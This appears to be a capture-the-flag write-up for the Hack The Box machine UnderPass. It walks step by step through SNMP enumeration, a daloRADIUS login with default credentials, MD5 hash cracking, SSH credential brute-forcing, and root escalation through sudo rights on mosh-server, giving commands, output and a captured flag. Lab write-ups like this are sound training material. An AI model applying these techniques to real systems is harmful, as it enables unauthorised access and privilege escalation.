---
icon: road
---

# HTB-UNDERPASS

<figure><img src="../../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

## **Attack Flow Explanation**

**Initial Access**

* **Web Fuzzing:** Scan and discover the `daloRADIUS` web application.
* **SNMP Enumeration:** Check for default community strings to find additional access paths.
* **Default Credentials:** Use known defaults (`administrator:radius`) to log in as **Operator**.
* **Crack Hash:** Extract svcMosh user’s password hash from the dashboard and crack it (e.g., `underwaterfriends`).

**SSH Access / Shell as svcMosh**

* Use the cracked password to SSH into the server as `svcMosh`.

**Privilege Escalation**

* **Check sudo privileges:** svcMosh can run `mosh-server` as root without password.
* **Run mosh-server:** Start the server, note the port and generated `MOSH_KEY`.
* **Connect with MOSH\_KEY:** Use `mosh-client` with the key to obtain a **root shell**.

**Outcome**

* Full admin/root access achieved.
* Can read sensitive files like `user.txt` and `root.txt`.

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/UnderPass]
└─$ blah blah blah
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.48:22
Open 10.10.11.48:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

Scanning 10.10.11.48 [2 ports]
Discovered open port 22/tcp on 10.10.11.48
Discovered open port 80/tcp on 10.10.11.48

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/26%OT=22%CT=%CU=38170%PV=Y%DS=2%DC=T%G=N%TM=68AD8443
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

A TCP scan with Nmap revealed only two open ports. The HTTP service on port 80 displayed a default page, and directory/file fuzzing did not return anything noteworthy. _(Hint: The outcome of fuzzing may depend on the chosen wordlist, which could contain the required entry.)_

Since initial enumeration did not provide useful leads, I extended the scan to UDP. This time, Nmap identified port 161 (SNMP) as open.

```
PORT    STATE SERVICE
161/udp open  snmp
```

## Initial Access <a href="#initial-access" id="initial-access"></a>

The Simple Network Management Protocol (SNMP) is used to gather information from network devices and exists in three versions. Versions 1 and 2 rely on a _community string_ for access control. A common misconfiguration is leaving the string unset or using the default value `public`, which is tracked as **CVE-1999-0517**.

Testing with the community string `public` and the `snmpwalk` tool successfully returned all available information from the host. Among the data were a potential username (`steve`) and a host description referencing **daloRADIUS**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/UnderPass]
└─$ snmpwalk -v2c -c public 10.10.11.48
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (205727) 0:34:17.27
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (207644) 0:34:36.44
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 08 1A 0A 19 23 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 215
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

daloRADIUS is an advanced RADIUS management application. Navigating to `/daloradius` on the target initially returns a 403 error. Reviewing the source code from the GitHub repository revealed multiple login endpoints. Attempting the standard user login was unsuccessful, but the default credentials `administrator:radius1` worked, granting access as an operator at `/daloradius/app/operators/login.php`.

<figure><img src="../../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Clicking the _Go to users list_ link on the home page redirected me to a table containing a single user, `svcMosh`. The string in the password column appeared to be an MD5 hash.

Using `john`, the hash `412DD4759978ACFCC81DEAB01B382403` was cracked within a few seconds, revealing the password `underwaterfriends`. With these credentials, I successfully logged in as `svcMosh` over SSH and retrieved the first flag.

<figure><img src="../../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

The `svcMosh` user has permission to run `mosh-server` (the server component of the Mobile Shell) as any user, including root

```bash
$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

Doing just that prints a connect string before detaching from the process and letting the server run in the background.

<pre class="language-bash"><code class="lang-bash">$ sudo /usr/bin/mosh-server 
 
 
MOSH CONNECT 60001 I+7tea6K/xSw5n+HFcITBQ
 
<strong>mosh-server (mosh 1.3.2) [build mosh 1.3.2]
</strong>Copyright 2012 Keith Winstein &#x3C;mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later &#x3C;http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
 
[mosh-server detached, pid = 1539]


</code></pre>

According to the documentation, the usage section explains how to provide the key to the client instead of a password. Following these instructions on the target host granted me an immediate shell as **root**

```bash
$ MOSH_KEY='I+7tea6K/xSw5n+HFcITBQ' mosh-client 127.0.0.1 60001
 
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### **2nd Method = (Shell as svcMosh → Root)**

#### **Initial Access – svcMosh**

**Enumerate daloRADIUS**

* A quick search shows many references to a default login: `administrator:radius`.
* Default credentials don’t work for the user login but succeed on the **operator login**.

**daloRADIUS Access**

* Logging in as **operator** reveals the users dashboard.
* Only one notable user exists: `svcMosh`.
* The associated 32-character password appears to be a hash.

**Cracking the hash**

* Using CrackStation, the hash resolves to:

```
underwaterfriends
```

***

#### **2️ SSH Access**

**Finding the correct username/password**

* Create user and password lists:

```bash
$ cat users.txt 
steve
svcmosh
root
$ cat passwords.txt 
underwaterfriends
412DD4759978ACFCC81DEAB01B382403
```

* Use `netexec` to brute-force SSH combinations:

```bash
$ netexec ssh underpass.htb -u users.txt -p passwords.txt --continue-on-success
SSH         10.10.11.48     22     underpass.htb    [+] svcMosh:underwaterfriends  Linux - Shell access!
```

> Username is case-sensitive. `svcmosh` succeeds; `SvcMosh` or `SVCMOSH` would fail.

**Connect via SSH:**

```bash
$ sshpass -p underwaterfriends ssh svcMosh@underpass.htb
svcMosh@underpass:~$ 
```

* Grab **user.txt**:

```bash
svcMosh@underpass:~$ cat user.txt 
a4569c2d52f1b97ec0109c747ea727f3e07ecdcf
```

***

#### **Privilege Escalation – Root Access**

**Enumeration**

* `svcMosh` home directory mostly empty.
* Found `sudo` privileges:

```bash
svcMosh@underpass:~$ sudo -l
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

**About Mosh**

* Remote terminal application allowing roaming and better session resilience than SSH.
* Supports key-based authentication via `MOSH_KEY`.

**Running mosh-server**

```bash
svcMosh@underpass:~$ sudo mosh-server 
MOSH CONNECT 60001 DTokqgn0cTYP6mTpvcQjSw
```

* Provides **port** and **MOSH\_KEY**.
* Subsequent servers give new ports/keys.

**Connecting using mosh-client**

```bash
svcMosh@underpass:/home$ MOSH_KEY=DTokqgn0cTYP6mTpvcQjSw mosh-client 127.0.0.1 60001
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
root@underpass:~#
```

* Successfully gets **root shell**.

**Grab root.txt**

```bash
root@underpass:~# cat root.txt
03148d5f************************
```

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
